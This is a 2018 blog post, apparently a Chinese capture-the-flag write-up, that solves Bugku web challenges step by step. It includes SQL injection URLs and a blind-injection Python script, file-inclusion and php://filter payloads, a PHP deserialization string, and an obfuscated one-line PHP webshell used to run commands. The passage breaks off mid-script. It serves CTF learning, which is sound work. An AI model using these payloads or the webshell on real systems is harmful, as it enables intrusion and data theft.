@@ -1,0 +1,1289 @@
+<!DOCTYPE html>
+
+
+
+ <html class="no-js"> 
+<head>
+    <title>Bugku ctf wp   &middot; BlankのBlog </title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta http-equiv="content-language" content="en-us" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="Blank">
+    <meta name="description" content="">
+    <link rel="shortcut icon" href="https://blank233.github.io/img/clover.png" type="image/x-icon" />
+    <meta name="generator" content="Hugo 0.37.1" />
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="https://blank233.github.io/css/smooth-scrollbar.css" />
+    <link rel="stylesheet" type="text/css" href="https://blank233.github.io/css/main.css" />
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/styles/tomorrow.min.css" />
+    
+
+    <style>
+        .posts li {
+            visibility: hidden;
+        }
+    </style> 
+</head>
+<body>
+    
+    
+
+    <header>	
+	<div class="h-wrap">
+		
+		<h1 class="title"><a href="https://blank233.github.io/">BlankのBlog</a></h1>
+		
+	</div>
+</header>
+    
+    <div class="site-wrapper" id="full-wrapper">
+        
+        <section class="single-wrap">
+            <article class="single-content" itemscope itemtype="//schema.org/BlogPosting">
+                <div class="feat">
+                    <h5 class="page-date">
+                    <time datetime="" itemprop="datePublished">
+                    14 March 2018
+                   
+                    </time>
+                    </h5>
+                </div>
+                <h1 class="page-title" itemprop="name headline">Bugku ctf wp </h1>
+                
+                
+                <h6>Topic:<a href="https://blank233.github.io/topics/Write_up">Write_up</a>
+                Tag:<a href="https://blank233.github.io/tags/2018-03">2018-03</a></h6>
+
+                <div itemprop="articleBody">
+                    <h1 id="bugku-ctf-wp-web">Bugku ctf wp &mdash;web</h1>
+
+<h3 id="ctf链接-http-ctf-bugku-com">ctf链接 <a href="http://ctf.bugku.com/">http://ctf.bugku.com/</a></h3>
+
+<p></p>
+
+<ul>
+<li>web2</li>
+</ul>
+
+<p>打开一片滑稽不停地向你飞来</p>
+
+<p>直接f12 查看源代码得到flag</p>
+
+<ul>
+<li>文件上传测试</li>
+</ul>
+
+<p>1、请上传PHP文件</p>
+
+<p>2、文件上传大小不允许超过1M</p>
+
+<p>上传php返回上传非图片文件，上传图片返回非PHP文件</p>
+
+<p>burp suite抓包发现只验证了 Content-Type: application/octet-stream字段，只要更改为image/png即可绕过，得到flag</p>
+
+<ul>
+<li>计算器</li>
+</ul>
+
+<p>输入答案发现只能输入一位数，f12更改maxlength值即可</p>
+
+<ul>
+<li>web基础$GET</li>
+</ul>
+
+<p>url后直接加?what=flag即可</p>
+
+<ul>
+<li>web基础$POST</li>
+</ul>
+
+<p>hack bar post一个what=flag即可</p>
+
+<ul>
+<li>矛盾</li>
+</ul>
+
+<p>php弱类型 变量num只要是1开头的字符串就可以 用get方式发送得到flag</p>
+
+<p>注：php弱类型不会可以点<a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">这里</a></p>
+
+<ul>
+<li>web3</li>
+</ul>
+
+<p>打开后不停弹窗，禁止使用javascript后查看源代码发现</p>
+
+<pre><code>&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;
+</code></pre>
+
+<p>unioncode解码得到flag</p>
+
+<ul>
+<li>Sql注入</li>
+</ul>
+
+<p>这道题折腾了一段时间，后来还是看到wp才知道宽字节注入 还是做的少了啊 sqliabs有时间还是要去做做</p>
+
+<p>测试url：<a href="http://103.238.227.13:10083/?id=1%df%27">http://103.238.227.13:10083/?id=1%df%27</a> 报错</p>
+
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1運'' LIMIT 1' at line 1
+
+#order by 1/2成功，3失败
+http://103.238.227.13:10083/?id=1%df%27%20order%20by%203--+
+
+#爆数据库
+http://103.238.227.13:10083/?id=1%df%27%20%20union%20select%201,group_concat(schema_name)%20from%20information_schema.schemata--+
+
+#然后根据题目提示构造url得到flag
+http://103.238.227.13:10083/?id=1%df%27union%20select%201,string%20from%20sql5.key%20where%20id%20=1--+
+</code></pre>
+
+<p><a href="https://www.cnblogs.com/lcamry/articles/5625276.html">宽字节注入参考</a></p>
+
+<ul>
+<li>Sql注入1</li>
+</ul>
+
+<p>过滤了一些关键词，但是那一句过滤xss的语句可以帮助我们绕过</p>
+
+<p>只要在关键词里添加&lt;&gt;分隔即可  不在赘述 直接放payload</p>
+
+<pre><code>http://103.238.227.13:10087/?id=1 unio&lt;&gt;n selec&lt;&gt;t 1,hash fr&lt;&gt;om sql3.key wh&lt;&gt;ere id=1 --+
+</code></pre>
+
+<ul>
+<li>你必须让他停下来</li>
+</ul>
+
+<p>burp suite抓包  查看响应包发现每次返回的图片不一样</p>
+
+<p>任意构造一个数值放到intruder 多次访问 查看返回包的数据长度即可得到flag</p>
+
+<ul>
+<li>本地包含</li>
+</ul>
+
+<p>打开网址，提示是文件包含漏洞，通过file使其以数组形式返回</p>
+
+<p>然后利用var_dump输出 eval执行  构造url</p>
+
+<pre><code>http://120.24.86.145:8003/?hello=file(%22flag.php%22)
+</code></pre>
+
+<ul>
+<li>变量1</li>
+</ul>
+
+<p>跟i春秋上一道题相同 args=$GLOBALS即可</p>
+
+<ul>
+<li>web5</li>
+</ul>
+
+<p>查看源代码 把jsfuck代码放到控制台执行即可</p>
+
+<ul>
+<li>头等舱</li>
+</ul>
+
+<p>查看源代码  什么也没有</p>
+
+<p>burpsuite抓包  放到repeater里  响应头里既有flag</p>
+
+<ul>
+<li>web4</li>
+</ul>
+
+<p>查看源代码  url解码得到</p>
+
+<pre><code>var p1 = 'function checkSubmit(){var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a){if(&quot;67d709b2b';
+var p2 = 'aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1}}document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;';
+eval(unescape(p1)   unescape('54aa2'   p2));
+#一段javascript代码  看wp后才知道是拼接字符串p1+54aa2+p2 发送即可
+</code></pre>
+
+<ul>
+<li>flag在index里面</li>
+</ul>
+
+<p>点击一下 chick me?no 跳转到</p>
+
+<pre><code>http://120.24.86.145:8005/post/index.php?file=show.php
+</code></pre>
+
+<p>看到传的参数是file=show.php file想到可能是文件包含 构造url</p>
+
+<pre><code>http://120.24.86.145:8005/post/index.php?file=php://filter/convert.base64-encode/resource=index.php
+</code></pre>
+
+<p>可以得到base64编码的index.php内容  解码得到flag</p>
+
+<p>附上<a href="http://www.hackdig.com/?03/hack-1892.htm">php://filter在php漏洞中的利用</a></p>
+
+<ul>
+<li>输入密码查看flag</li>
+</ul>
+
+<p>burp suite爆破  查看返回包长度得到flag</p>
+
+<ul>
+<li>点击一百万次</li>
+</ul>
+
+<p>查看源代码</p>
+
+<pre><code>    var clicks=0
+    $(function() {
+      $(&quot;#cookie&quot;)
+        .mousedown(function() {
+          $(this).width('350px').height('350px');
+        })
+        .mouseup(function() {
+          $(this).width('375px').height('375px');
+          clicks++;
+          $(&quot;#clickcount&quot;).text(clicks);
+          if(clicks &gt;= 1000000){
+          	var form = $('&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;' +
+						'&lt;input type=&quot;text&quot; name=&quot;clicks&quot; value=&quot;' + clicks + '&quot; hidden/&gt;' +
+						'&lt;/form&gt;');
+						$('body').append(form);
+						form.submit();
+          }
+        });
+    });
+</code></pre>
+
+<p>用hackbar POST一个参数clicks 让它大于1000000就行了</p>
+
+<ul>
+<li>备份是个好习惯</li>
+</ul>
+
+<p>打开给了一串字符 不知道干嘛的  题目提示备份  url中添加index.php.bak得到index.php的源码</p>
+
+<pre><code>&lt;?php
+/**
+ * Created by PhpStorm.
+ * User: Norse
+ * Date: 2017/8/6
+ * Time: 20:22
+*/
+
+include_once &quot;flag.php&quot;;
+ini_set(&quot;display_errors&quot;, 0);
+$str = strstr($_SERVER['REQUEST_URI'], '?');
+$str = substr($str,1);
+$str = str_replace('key','',$str);
+parse_str($str);把查询字符串解析到变量中：
+echo md5($key1);
+
+echo md5($key2);
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){
+    echo $flag.&quot;取得flag&quot;;
+}
+?&gt;
+
+#代码解析
+
+$str = strstr($_SERVER['REQUEST_URI'], '?'); #获取url?之后的内容 包含?
+$str = substr($str,1); #从第一位开始截取$str后面的内容
+$str = str_replace('key','',$str); #把$str里面的'key'替换为''
+parse_str($str); #parse_str把查询字符串解析到变量中
+
+</code></pre>
+
+<p>附parse_str例子</p>
+
+<pre><code>&lt;?php
+parse_str(&quot;name=Bill&amp;age=60&quot;);
+echo $name.&quot;&lt;br&gt;&quot;;
+echo $age;
+?&gt;
+#输出为Bill和60
+</code></pre>
+
+<p>思路就是用get方式发送两个参数key1 和 key2 其中key1和key2的md5在 == 下比较相同 但值不同</p>
+
+<p>在这里用到了php的弱类型 只要key1 和 key2以0e开头即可得到flag</p>
+
+<p>附上一个网站：<a href="http://www.mamicode.com/info-detail-1719711.html">0e开头MD5值小结</a></p>
+
+<ul>
+<li>成绩单</li>
+</ul>
+
+<p>没啥可说的 判断出闭合方式就行
+附上payload</p>
+
+<pre><code>http://120.24.86.145:8002/chengjidan/index.php
+postdata:id=-1'union select 1,group_concat(skctf_flag),3,4 from skctf_flag.fl4g--+
+</code></pre>
+
+<ul>
+<li>秋名山司机</li>
+</ul>
+
+<p>一看就知道要用脚本  这尼玛自己算不存在的</p>
+
+<p>附上python脚本 一跑就出来了</p>
+
+<pre><code>import requests
+import re
+
+#由于每次给的数值不一样 所以要用session
+s = requests.Session()
+url = 'http://120.24.86.145:8002/qiumingshan/'
+r = s.get(url)
+
+rule = '&lt;div&gt;(.+?)\=\?;&lt;/div&gt;'
+res = re.findall(rule,r.content)
+
+#python eval函数是真的强
+data = {
+	&quot;value&quot;:eval(res[0])
+}
+
+r = s.post(url,data=data)
+print r.content
+</code></pre>
+
+<ul>
+<li>速度要快</li>
+</ul>
+
+<p>查看源代码</p>
+
+<pre><code>&lt;!-- OK ,now you have to post the margin what you find --&gt;
+</code></pre>
+
+<p>f12 在相应头发现一个flag字段 值是一个base64加密的字符串 解码后给了flag 然而并不对</p>
+
+<p>还发现每次给的flag值不相同 试了试发现每次给的flag还能在用base64解码一次  尝试把二次解码的数据发送  得到flag</p>
+
+<p>附上脚本</p>
+
+<pre><code>import requests
+import base64
+
+s = requests.Session()
+url = 'http://120.24.86.145:8002/web6/'
+
+r = s.get(url)
+a = base64.b64decode(r.headers['flag'])
+print a 
+b = a.split(': ')[1]
+b = base64.b64decode(b)
+data = {
+	&quot;margin&quot;:b
+}
+r = s.post(url,data=data)
+print r.content
+</code></pre>
+
+<ul>
+<li>cookies欺骗</li>
+</ul>
+
+<p>打开后一段乱七八糟的字符串  解密也解不开</p>
+
+<p>然后发现urlfilename的值是一个base64加密的字符串  解密后得到keys.txt  访问keys.txt发现内容跟之前的是一样的 不过是截取了一部分</p>
+
+<p>尝试得到index.php的源代码 将index.php base64加密后访问  通过改变file值来读取内容  获取内容脚本如下</p>
+
+<pre><code>#获取index.php
+import requests
+
+a = 1
+f = open('index.php','w')
+while a &lt; 20:
+	url = 'http://120.24.86.145:8002/web11/index.php?line='+ str(a) +'&amp;filename=aW5kZXgucGhw'
+	a = a+1
+	r = requests.get(url)
+	f.write(r.content)
+
+f.close()
+</code></pre>
+
+<p>得到源代码</p>
+
+<pre><code>error_reporting(0);
+
+$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:&quot;&quot;);
+
+$line=isset($_GET['line'])?intval($_GET['line']):0;
+
+if($file=='') header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);
+
+$file_list = array(
+
+'0' =&gt;'keys.txt',
+
+'1' =&gt;'index.php',
+
+);
+
+ 
+if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin'){
+
+$file_list[2]='keys.php';
+
+}
+
+ 
+if(in_array($file, $file_list)){
+
+$fa = file($file);
+
+echo $fa[$line];
+
+}
+
+?&gt;
+
+</code></pre>
+
+<p>可以看到构造一个Cookie  字段和值均为margin  发送到keys.php即可得到flag</p>
+
+<p>注keys.php需要base64加密</p>
+
+<ul>
+<li>never give up</li>
+</ul>
+
+<p>查看源代码 得到一个tip 1p.html</p>
+
+<p>尝试访问但是却直接跳转到论坛主页  但是  但是  但是 在view-source:下查看源代码却没有跳转而是直接可以看到源代码</p>
+
+<pre><code>&lt;HTML&gt;
+&lt;HEAD&gt;
+&lt;SCRIPT LANGUAGE=&quot;Javascript&quot;&gt;
+&lt;!--
+
+
+var Words =&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot; 
+function OutWord()
+{
+var NewWords;
+NewWords = unescape(Words);
+document.write(NewWords);
+} 
+OutWord();
+// --&gt;
+&lt;/SCRIPT&gt;
+&lt;/HEAD&gt;
+&lt;BODY&gt;
+&lt;/BODY&gt;
+&lt;/HTML&gt;
+</code></pre>
+
+<p>在源代码中 看到一个加密的超级长的字段  经过url-base64-url解密后得到一段php代码</p>
+
+<pre><code>if(!$_GET['id'])
+{
+	header('Location: hello.php?id=1');
+	exit();
+}
+$id=$_GET['id'];
+$a=$_GET['a'];
+$b=$_GET['b'];
+if(stripos($a,'.')) 
+{
+	echo 'no no no no no no no';	
+	return;
+}
+$data = @file_get_contents($a,'r');
+if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4) 
+{
+	require(&quot;f4l2a3g.txt&quot;);
+}
+else
+{
+	print &quot;never never never give up !!!&quot;;
+}
+
+?&gt;
+</code></pre>
+
+<p><strong>id</strong>:id的值 == 0但是又不能为0 id=0a即可绕过</p>
+
+<p><strong>a</strong>:$data==&ldquo;bugku is a nice plateform!&rdquo;  可以用令a=php://input  然后postbugku is a nice plateform!即可绕过.</p>
+
+<p><strong>b</strong>:eregi函数遇到%00就会截断 所以令b=%00444444即可绕过</p>
+
+<p>最终payload如下</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/Bugku_ctf_wp_1/1.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<ul>
+<li>welcome to bugkuctf</li>
+</ul>
+
+<p>打开链接 查看源代码  得到注释的一些代码  如下</p>
+
+<pre><code>$user = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$pass = $_GET[&quot;password&quot;];  
+  
+if(isset($user)&amp;&amp;(file_get_contents($user,'r')===&quot;welcome to the bugkuctf&quot;)){  
+    echo &quot;hello admin!&lt;br&gt;&quot;;  
+    include($file); //hint.php  
+}else{  
+    echo &quot;you are not admin ! &quot;;  
+}  
+</code></pre>
+
+<p>GET方式传递三个参数txt，file和password</p>
+
+<p>首先  跟上一题一样  我们可以使用php://input的方式绕过file_get_contents()</p>
+
+<p>构造测试</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/Bugku_ctf_wp_1/2.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>然后可以看到下面有一个include函数 文件包含 同样使用php的文件流得到hint.php base64后的源码</p>
+
+<p>测试如图</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/Bugku_ctf_wp_1/3.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>解码后代码如下</p>
+
+<pre><code>&lt;?php  
+  
+class Flag{//flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+			echo &quot;&lt;br&gt;&quot;;
+		return (&quot;good&quot;);
+        }  
+    }  
+}  
+?&gt;  
+</code></pre>
+
+<p>php反序列化 (不要问我怎么知道的 我也不知道)</p>
+
+<p>O:4:&ldquo;Flag&rdquo;:1:{s:4:&ldquo;file&rdquo;;s:57:&ldquo;php://filter/read=convert.base64-encode/resource=flag.php&rdquo;;}</p>
+
+<p>然后最终payload如下</p>
+
+<p>
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/Bugku_ctf_wp_1/4.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+base64解码后得到flag</p>
+
+<pre><code>&lt;?php  
+//flag{php_is_the_best_language}  1
+?&gt;
+</code></pre>
+
+<p><strong>关于php反序列化有时间写一篇博客或笔记</strong></p>
+
+<ul>
+<li>过狗一句话</li>
+</ul>
+
+<p>tip给了一个一句话木马 刚开始没意识到这东西的重要性 = =</p>
+
+<pre><code>&lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt;
+</code></pre>
+
+<p>点开啥都没有 查看源代码 burp suite抓包都试过没用  然后想到最开始那个木马  尝试一下</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/Bugku_ctf_wp_1/5.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>真的可以 接着尝试system(&lsquo;ls&rsquo;)查看目录  然而返回空白 可能是没权限</p>
+
+<p>测试查询所有php文件</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/Bugku_ctf_wp_1/6.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>查看所有的txt文件</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/Bugku_ctf_wp_1/7.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>查看flag.txt文件内容 得到flag</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/Bugku_ctf_wp_1/8.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<ul>
+<li>字符？正则？</li>
+</ul>
+
+<p>正则匹配  慢慢绕</p>
+
+<pre><code> &lt;?php 
+highlight_file('2.php');
+$key='KEY{********************************}';
+$IM= preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);
+# 正则解析
+# / 表示开始 匹配字符串key .*匹配任意字符0次或多次 匹配字符串key .{4,7}匹配任意字符4到7次 匹配key:
+# \/ \表示转义 匹配/ 匹配任意字符 匹配/ 匹配任意字符一次或多次跟key组合起来 匹配一个字母 匹配一个符号 结束 大小写不敏感
+# 例 key1key1234key:/1/1keya;
+if( $IM ){ 
+  die('key is: '.$key);
+}
+?&gt; 
+</code></pre>
+
+<ul>
+<li>前女友(SKCTF)</li>
+</ul>
+
+<p>打开后 真是一个凄美的爱情故事  红红火火红红火火恍恍惚惚</p>
+
+<p>查看源代码  发现链接两个字可以跳转 点击跳转 得到如下代码</p>
+
+<pre><code>&lt;?php
+if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+    $v3 = $_GET['v3'];
+    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2)){
+        if(!strcmp($v3, $flag)){
+            echo $flag;
+        }
+    }
+}
+?&gt;
+</code></pre>
+
+<p>v1 v2值不同 md5值相同  可以用上述0e开头的md5字符串绕过</p>
+
+<p>strcmp函数漏洞 v3只要是一个数组就可以绕过</p>
+
+<p>payload <a href="http://118.89.219.210:49162/?v1=s1885207154a&amp;v2=s1836677006a&amp;v3[]=1">http://118.89.219.210:49162/?v1=s1885207154a&amp;v2=s1836677006a&amp;v3[]=1</a></p>
+
+<ul>
+<li>login1(SKCTF)</li>
+</ul>
+
+<p>sql约束攻击</p>
+
+<pre><code>注册界面用户名设为admin                                 1
+密码只要符合要求就行
+然后就可以使用自己设置的密码登陆admin账户了 登陆即可拿到flag
+</code></pre>
+
+<p>不懂SQL约束攻击可以点击<a href="http://www.freebuf.com/articles/web/124537.html">这里！</a></p>
+
+<p>看完就懂了</p>
+
+<ul>
+<li>你从哪里来</li>
+</ul>
+
+<p>抓包  更改refer为谷歌网址就行了</p>
+
+<ul>
+<li>md5 collision(NUPT_CTF)</li>
+</ul>
+
+<p>我只能说这题很不友好  毫无提示  让我蒙出来了</p>
+
+<p>本以为是md5(NUPT_CTF)  结果好像还是0e开头的字符串md5值比较</p>
+
+<ul>
+<li>各种绕过呦</li>
+</ul>
+
+<p>shal漏洞 百度一下就有</p>
+
+<p>payload 如下</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="/post/img/Bugku_ctf_wp_1/9.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<ul>
+<li>web8</li>
+</ul>
+
+<p>还是file_get_contents 使用php://input绕过得到flag</p>
+
+<ul>
+<li>细心</li>
+</ul>
+
+<p>点进去一看就是个假的404 查看下robots.txt  发现一个resusl.php</p>
+
+<p>访问后最下方有一行代码</p>
+
+<p>各种尝试无果后想到了tip的admin  使x=admin即可</p>
+
+<ul>
+<li>这是一个神奇的登陆框(4-3更)</li>
+</ul>
+
+<p>网址上的sql提示这是sql注入 既然是sql注入就开始测试万能密码 admin&rdquo;or 1=1#登陆成功</p>
+
+<p>只输入一个双引号测试时 报错如下</p>
+
+<pre><code>Try Again!
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;&quot;&quot; and w_passwd=&quot;&quot;' at line 1
+</code></pre>
+
+<p>可以看到是&rdquo;闭合 然后就注呗</p>
+
+<p>附上payload</p>
+
+<p>1,2返回正常 1,2,3返回错误 说明有2列</p>
+
+<pre><code>1&quot;union select 1,2#
+</code></pre>
+
+<p>爆数据库</p>
+
+<pre><code>1&quot;union select 1,count(*) from information_schema.tables group by concat(database(),0x3a,floor(rand(0)*2))#
+</code></pre>
+
+<p>爆数据表</p>
+
+<pre><code>1&quot;union select 1,count(*) from information_schema.tables group by concat((select concat(table_name) from information_schema.tables where table_schema='bugkusql1' limit 1),0x3a,floor(rand(0)*2))#
+</code></pre>
+
+<p>列</p>
+
+<pre><code>1&quot;union select 1,count(*) from information_schema.tables group by concat((select concat(column_name) from information_schema.columns where table_schema='bugkusql1' and table_name='flag1' limit 1),0x3a,floor(rand(0)*2))#
+</code></pre>
+
+<p>爆数据</p>
+
+<pre><code>1&quot;union select 1,count(*) from information_schema.tables group by concat((select flag1 from bugkusql1.flag1),0x3a,floor(rand(0)*2))#
+</code></pre>
+
+<ul>
+<li>多次</li>
+</ul>
+
+<p>发现url中有一个id值，然后修改id值发现是sql注入</p>
+
+<p>测试&rsquo; 报错 加上注释 正确 单引号闭合</p>
+
+<p>但是在测试and 1=1 时发现报错  猜想可能是过滤 然后anandd 1=1测试 返回正确</p>
+
+<p>判断过滤了那些关键词</p>
+
+<pre><code>http://120.24.86.145:9004/1ndex.php?id=5%27 aandnd 0=length('and')--+
+</code></pre>
+
+<p>更改and发现还过滤了or union select</p>
+
+<p>判断列数</p>
+
+<pre><code>http://120.24.86.145:9004/1ndex.php?id=5%27 oorrder by 2--+
+</code></pre>
+
+<p>直接放payload吧  一次一次的写累，，#后为返回内容</p>
+
+<pre><code>http://120.24.86.145:9004/1ndex.php?id=-5%27 uniounionn seleselectct 1,group_concat(schema_name) from infoorrmation_schema.schemata--+
+#information_schema,web1002-1
+
+http://120.24.86.145:9004/1ndex.php?id=-5%27 uniounionn seleselectct 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema='web1002-1'--+
+#flag1,hint
+
+http://120.24.86.145:9004/1ndex.php?id=-5%27 uniounionn seleselectct 1,group_concat(column_name) from infoorrmation_schema.columns where table_schema='web1002-1' anandd table_name='flag1'--+
+#flag1,address
+
+
+http://120.24.86.145:9004/1ndex.php?id=-5%27 uniounionn seleselectct 1,group_concat(flag1) from `web1002-1`.flag1--+
+#usOwycTju+FTUUzXosjr
+
+http://120.24.86.145:9004/1ndex.php?id=-5%27 uniounionn seleselectct 1,group_concat(address) from `web1002-1`.flag1--+
+# ./Once_More.php 下一关地址
+
+</code></pre>
+
+<p>然后又来到了另一个界面  嗯  继续注</p>
+
+<p>id=1 id=1&rsquo; 报错发现是单引号闭合</p>
+
+<p>and 1=1 order by 2 素质四连 开始联合查询</p>
+
+<pre><code>http://120.24.86.145:9004/Once_More.php?id=1%27union select 1,2%23
+# My Id =1' select 1,2#
+</code></pre>
+
+<p>发现union被过滤了 尝试之前的方法也不行 索性看看他都过滤了啥  反正有回显</p>
+
+<pre><code>http://120.24.86.145:9004/Once_More.php?id=1%27union and or select from name mid substr left ascii sleep limit%23
+# My Id =1' and or select from name mid left ascii limit#
+</code></pre>
+
+<p>过滤了union substr sleep三个词</p>
+
+<p>呃呃  盲注？？  附上脚本</p>
+
+<pre><code>import requests
+
+def length_schema():
+    for x in range(1,20):
+        url = 'http://120.24.86.145:9004/Once_More.php?id=1%27and%20length(database())='+str(x)+'%23'
+        s = requests.get(url)
+        if &quot;Hello&quot; in s.text:
+            print 'schema_length is :' + str(x)
+            global a
+            a = int(x)
+            schema_name()
+            break
+        
+def schema_name():
+    x = 0
+    name = ''
+    while x &lt; a:
+        x = x + 1
+        temp = 'abcdefghijklmnopqrstuvwxyz0123456789!@$%^&amp;*()_+=-|}{:?&gt;&lt;[];,.`~' 
+        for i in temp:
+            url = 'http://120.24.86.145:9004/Once_More.php?id=1%27and%20mid(database(),'+ str(x) +',1)=%27'+str(i)+'%27%23'
+            s = requests.get(url)
+            if &quot;Hello&quot; in s.text:
+                name = name + str(i)
+
+    print 'sechma_name is :' + name
+    global schema_name
+    schema_name = name
+    all()
+
+def all():
+    temp = 'abcdefghijklmnopqrstuvwxyz0123456789!@$%^&amp;*()_+=-|}{:?&gt;&lt;[];,.`~'
+    temp_data = 'abcdefghijklmnopqrstuvwxyz0123456789!@$%^&amp;*()_+=-|}{:?&gt;&lt;[];,.`~ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    for x in xrange(0,20):
+        table_name = ''
+        for y in xrange(1,20):
+            key = 0
+            for i in temp:
